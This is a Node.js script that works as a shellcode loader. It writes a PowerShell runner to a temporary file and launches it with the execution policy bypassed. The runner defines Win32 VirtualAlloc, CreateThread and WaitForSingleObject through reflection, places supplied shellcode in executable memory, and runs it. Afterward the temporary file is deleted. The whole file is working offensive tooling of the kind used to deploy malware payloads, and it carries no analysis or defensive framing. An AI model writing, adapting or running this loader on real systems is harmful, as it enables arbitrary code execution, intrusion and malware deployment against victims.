const fs = require('fs');
const path = require('path');
const { spawn } = require('child_process');
const { tmpdir } = require('os');

function executeFileBased(binPath) {
    console.log('[+] File-based shellcode execution...');
    
    try {
        const shellcode = fs.readFileSync(binPath);
        const base64Shellcode = shellcode.toString('base64');
        const tempDir = tmpdir();
        
        console.log(`[+] Shellcode: ${shellcode.length} bytes`);
        
        // Create PowerShell script file
        const psScript = `# PowerShell Shellcode Runner - File Based
Write-Host "[+] Starting shellcode execution..." -ForegroundColor Yellow

try {
    # Load shellcode from base64
    $ShellcodeBytes = [Convert]::FromBase64String('${base64Shellcode}')
    Write-Host "[+] Shellcode loaded: $($ShellcodeBytes.Length) bytes" -ForegroundColor Green
    
    # Use reflection to avoid compilation
    $Assembly = [System.Reflection.Assembly]::LoadWithPartialName("System.Core")
    
    # Define Win32 methods using reflection
    $Domain = [AppDomain]::CurrentDomain
    $DynAssembly = New-Object System.Reflection.AssemblyName('Win32Methods')
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('Win32Module', $false)
    $TypeBuilder = $ModuleBuilder.DefineType('Win32', 'Public, Class')
    
    # VirtualAlloc
    $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod('VirtualAlloc', 'kernel32.dll', 
        [System.Reflection.MethodAttributes]::Public -bor [System.Reflection.MethodAttributes]::Static,
        [System.Reflection.CallingConventions]::Standard,
        [IntPtr],
        [Type[]]@([IntPtr], [UInt32], [UInt32], [UInt32]),
        [Runtime.InteropServices.CallingConvention]::Winapi,
        [Runtime.InteropServices.CharSet]::Auto)
    $PInvokeMethod.SetImplementationFlags($PInvokeMethod.GetMethodImplementationFlags() -bor [System.Reflection.MethodImplAttributes]::PreserveSig)
    
    # CreateThread
    $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod('CreateThread', 'kernel32.dll',
        [System.Reflection.MethodAttributes]::Public -bor [System.Reflection.MethodAttributes]::Static,
        [System.Reflection.CallingConventions]::Standard,
        [IntPtr],
        [Type[]]@([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]),
        [Runtime.InteropServices.CallingConvention]::Winapi,
        [Runtime.InteropServices.CharSet]::Auto)
    $PInvokeMethod.SetImplementationFlags($PInvokeMethod.GetMethodImplementationFlags() -bor [System.Reflection.MethodImplAttributes]::PreserveSig)
    
    # WaitForSingleObject
    $PInvokeMethod = $TypeBuilder.DefinePInvokeMethod('WaitForSingleObject', 'kernel32.dll',
        [System.Reflection.MethodAttributes]::Public -bor [System.Reflection.MethodAttributes]::Static,
        [System.Reflection.CallingConventions]::Standard,
        [UInt32],
        [Type[]]@([IntPtr], [UInt32]),
        [Runtime.InteropServices.CallingConvention]::Winapi,
        [Runtime.InteropServices.CharSet]::Auto)
    $PInvokeMethod.SetImplementationFlags($PInvokeMethod.GetMethodImplementationFlags() -bor [System.Reflection.MethodImplAttributes]::PreserveSig)
    
    $Win32Type = $TypeBuilder.CreateType()
    
    Write-Host "[+] Win32 APIs loaded via reflection" -ForegroundColor Green
    
    # Allocate memory
    Write-Host "[+] Allocating executable memory..." -ForegroundColor Yellow
    $MemoryAddress = $Win32Type::VirtualAlloc([IntPtr]::Zero, $ShellcodeBytes.Length, 0x3000, 0x40)
    
    if ($MemoryAddress -eq [IntPtr]::Zero) {
        Write-Host "[-] Memory allocation failed!" -ForegroundColor Red
        exit 1
    }
    
    Write-Host "[+] Memory allocated successfully" -ForegroundColor Green
    
    # Copy shellcode to memory
    Write-Host "[+] Copying shellcode to memory..." -ForegroundColor Yellow
    [System.Runtime.InteropServices.Marshal]::Copy($ShellcodeBytes, 0, $MemoryAddress, $ShellcodeBytes.Length)
    
    # Execute
    Write-Host "[+] Creating execution thread..." -ForegroundColor Yellow
    $ThreadHandle = $Win32Type::CreateThread([IntPtr]::Zero, 0, $MemoryAddress, [IntPtr]::Zero, 0, [IntPtr]::Zero)
    
    if ($ThreadHandle -eq [IntPtr]::Zero) {
        Write-Host "[-] Thread creation failed!" -ForegroundColor Red
        exit 1
    }
    
    Write-Host "[+] Thread created, waiting for completion..." -ForegroundColor Green
    $Win32Type::WaitForSingleObject($ThreadHandle, [UInt32]::MaxValue) | Out-Null
    
    Write-Host "[+] Shellcode execution completed successfully!" -ForegroundColor Green
    
} catch {
    Write-Host "[-] Error: $($_.Exception.Message)" -ForegroundColor Red
}

Write-Host "[+] Script finished" -ForegroundColor Cyan`;

        // Write PowerShell script to file
        const psFilePath = path.join(tempDir, 'execute.ps1');
        fs.writeFileSync(psFilePath, psScript);
        
        console.log('[+] PowerShell script created:', psFilePath);
        console.log('[+] Executing...');
        
        // Execute the PowerShell script
        const child = spawn('powershell.exe', [
            '-ExecutionPolicy', 'Bypass',
            '-File', psFilePath
        ], {
            stdio: 'inherit'
        });

        child.on('close', (code) => {
            console.log(`[+] PowerShell exited with code: ${code}`);
            // Cleanup
            try {
                fs.unlinkSync(psFilePath);
            } catch(e) {}
        });

    } catch (error) {
        console.error('[-] Execution failed:', error.message);
    }
}

// Main
const args = process.argv.slice(2);
if (args.length >= 1) {
    const binPath = path.resolve(args[0]);
    if (fs.existsSync(binPath)) {
        executeFileBased(binPath);
    } else {
        console.error('[-] File not found:', binPath);
    }
} else {
    console.log('Usage: node file-based-loader.cjs <bin_file>');
}
